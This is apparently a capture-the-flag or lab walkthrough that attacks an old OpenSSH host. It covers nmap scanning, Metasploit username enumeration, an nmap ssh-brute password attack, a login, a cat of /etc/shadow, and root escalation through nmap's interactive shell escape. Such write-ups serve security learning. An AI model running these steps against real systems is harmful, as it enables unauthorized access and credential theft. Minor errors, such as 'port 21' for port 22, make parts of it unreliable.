# Port 22 SSH

## 📄 Step: 1. Scanning for SSH vulnurabilty through nmap built-in script.

    nmap **Target-IP** -p 22 -sV -sC

Explanation:

  -  nmap Target-IP basic usage of nmap
  - -p 22 --------> search for port 22 only
  - -sV ----------> Finds service version
  - -sC ----------> uses default nmap scripts to find vuln

✅ The machine seems to be running OpenSSH-4.7p1.

<img width="874" height="548" alt="4 SSH-Scan" src="https://github.com/user-attachments/assets/06642d7a-bfb5-4361-b953-1ea4c14a5625" />


## ⚙️ STEP: 2. User Enumration through Metasploit ssh_enumusers auxiliary scanner.

The ssh_enumusers module in Metasploit is an auxiliary scanner designed to enumerate valid 
usernames on a target OpenSSH server by exploiting malformed packets or timing attacks

👉 In Terminal type-

    msfconsole
    search openssh 
    use auxiliary/scanner/ssh/ssh_enumusers
    set RHOSTS **Target-IP**
    run

<img width="1112" height="409" alt="5 SSH-enum" src="https://github.com/user-attachments/assets/d8edd864-abbe-445b-a39f-2220594d8e77" />

👇 These are the result of the username scanner,
save these usernames in a UserNames.txt.

<img width="502" height="163" alt="6 User-Found" src="https://github.com/user-attachments/assets/9734cf7d-c432-4713-a663-1d8c6aeb22b3" />

## 📄 Step: 3. Use nmap built-in ssh-brute.nse script to find passwords for users.

👉 In Terminal Type-

    nmap --script ssh-brute.nse -p 22 **Target-IP** --script-args userdb=**UserName.txt**,brute.firstonly

Explanation:

 - --script ssh-brute.nse ---> Specify the ssh-brute.nse script
 - -p 21 **Target-Ip** ------> Specify Target-IP and the port 21 
 - --script-args ------------> Specify the arguments for the scripts
 - userdb=**UserName.txt** --> Specify the username list
 - brute.firstonly ----------> Tells nmap to stop after finding one successfull credential 

## 🔥 Credentials Found

<img width="829" height="509" alt="8 Success-Brute" src="https://github.com/user-attachments/assets/1d933049-9cf5-4962-acda-17eb8284dc64" />

    
## 👉 Step: 4. Initial Access

We started by gaining access to the target machine using Telnet:

    telnet **<Target-IP>**

The login credentials were obtained earlier using an Nmap NSE script (ssh-brute.nse) during enumeration.
This gave us a low-privileged user shell.

<img width="818" height="629" alt="9 connecting" src="https://github.com/user-attachments/assets/517ddb27-86dc-425e-81ee-f5ae126762cc" />


## 👤 Limited User Permissions

After logging in, we verified that the user had restricted privileges. For example:

    cat /etc/shadow


This failed due to insufficient permissions, confirming that we needed to escalate privileges.

<img width="691" height="564" alt="10 user" src="https://github.com/user-attachments/assets/39ccbd4f-00b3-45e0-8291-4db7b80cb183" />

## 💡 Step: 5. Searching for SUID Binaries

To find potential privilege escalation vectors, we searched for files with the SUID bit set:

    find / -perm -4000 2>/dev/null

Explanation:

 - find / --------> searches from the root directory
 - -perm  --------> finds files with the SUID (Set User ID) permission
 - -4000 ---------> SUID bit, this means the file runs with the owner’s privileges (often root)
 - 2>/dev/null ---> hides error messages (like permission denied)


👇 This gives us results with interesting binary files that runs by *owner's* privileges :

 - /usr/bin/nmap

<img width="916" height="571" alt="11" src="https://github.com/user-attachments/assets/7a069496-f984-4ddf-8267-c1303c5cb4d2" />

📄 If we check its version:

    nmap --version

Its an old version (4.53), which is known to be vulnerable and supports interactive mode.

## ⚙️ Step: 6. Privilege Escalation via Nmap

Exploiting its interactive mode:

    nmap --interactive

Inside the interactive prompt:

    !sh

## 🔥 This spawned a shell with root privileges.

<img width="911" height="309" alt="12 Root-Access" src="https://github.com/user-attachments/assets/072b1877-0a2e-4036-bc79-6b26585c496d" />


